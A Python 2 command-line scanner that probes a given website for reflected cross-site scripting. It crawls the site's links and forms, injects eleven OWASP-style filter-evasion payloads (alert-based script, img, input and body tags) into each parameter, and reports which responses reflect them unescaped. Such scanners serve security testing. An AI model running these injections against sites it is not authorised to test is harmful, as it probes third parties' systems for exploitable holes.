import sys
import urllib2
from urllib import urlencode
from cookielib import CookieJar
from lxml.html import fromstring

class Xss(object):
    def __init__(self, url):
        self.comp = ["&gt;alert(",
                     "&lt;ImG",
                     "&lt;INPUT",
                     "&lt;BODY"
                     ]
        self.url = url
        self.get = []
        self.post = []
        self.headers = [("Content-type", "application/x-www-form-urlencoded")
            , ('User-Agent',
               'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.0.14) Gecko/2009082706 Firefox/3.0.14')
            , ("Accept", "text/plain")]
        self.cj = CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))
        self.opener.addheaders = self.headers
        self.vectors = 0
        self.success = 0

    def parse(self, xsscript):
        links = {}
        resp = self.opener.open(self.url).read()
        doc = fromstring(resp)
        doc.make_links_absolute(self.url)

        for (el, attr, link, pos) in doc.iterlinks():
            href = link.split("?")
            if len(href) == 2:
                action, fields = link.split("?")
                if action not in links:
                    links[action] = {}
                for field in fields.split("&"):
                    name, value = field.split("=")
                    links[action][name] = value

        for action in links:
            for field, value in links[action].iteritems():
                params = dict(links[action])
                params[field] = xsscript
                request = action + "?" + urlencode(params)
                self.get.append(request)

        for form in doc.forms:
            for field, value in form.form_values():
                params = dict(form.form_values())
                params[field] = xsscript
                action = form.action
                if action == None: action = ""
                request = action + "?" + urlencode(params)
                method = form.method.lower()
                if method == "post":
                    self.post.append((action, urlencode(params)))
                else:
                    self.get.append(request)

        self.vectors = (len(self.get) + len(self.post)) / 11

    def scan(self):
        print "Scanning " + str(self.vectors) + " vector(s)"

        for request in self.get:
            print "GET " + request
            try:
                resp = self.opener.open(request).read()
                self.print_match(resp)
            except:
                print "Error!"

        for action, params in self.post:
            print "POST " + action + "?" + params
            try:
                req = urllib2.Request(action, params)
                response = urllib2.urlopen(req)
                resp = response.read()
                self.print_match(resp)
            except:
                print "Error!"

    def print_match(self, resp):
        filtered = 0
        for checker in self.comp:
            filtered += resp.find(checker)
        if (filtered == -4) & (resp.find("XSSVVVV") != -1):
            self.success += 1
            print "Found XSS Vulnerability..."

""" Main """
if __name__ == "__main__":
    from optparse import OptionParser

    payloads = ["<ScrIpt>alert('XSSVVVV')</scRiPt>",
             "<sc<script>ript>alert('XSSVVVV')<</script>/script>",
             "<scscriPtript>alert('XSSVVVV')</scrscRiptipt>",
             "<ImG SRC=JaVaScRiPt:alert('XSSVVVV')",
             "<ImG \"\"\"><SCRIPT>alert(\"XSSVVVV\")</SCRIPT>\">",
             "<ImG src = XVVVV.jpg onerror=\"javascript:alert('XSSVVVV')\"/>",
             "<ImG DYNSRC=\"javascript:alert('XSSVVVV')\">",
             "</TITLE><SCRIPT>alert(\"XSSVVVV\");</SCRIPT>",
             "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSSVVVV');\">",
             "<BODY ONLOAD=alert('XSSVVVV')>",
             "<BODY BACKGROUND=\"javascript:alert('XSSVVVV')\">"]

    parser = OptionParser()
    (options, args) = parser.parse_args()
    if len(args) == 1:
        xss = Xss(args[0])
        for script in payloads:
            xss.parse(script)
        xss.scan()
        print "Succeed XSS :" + str(xss.success) + " of 11"
    else:
        print "Error: %s takes one argument (the website)" % sys.argv[0]

# https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#META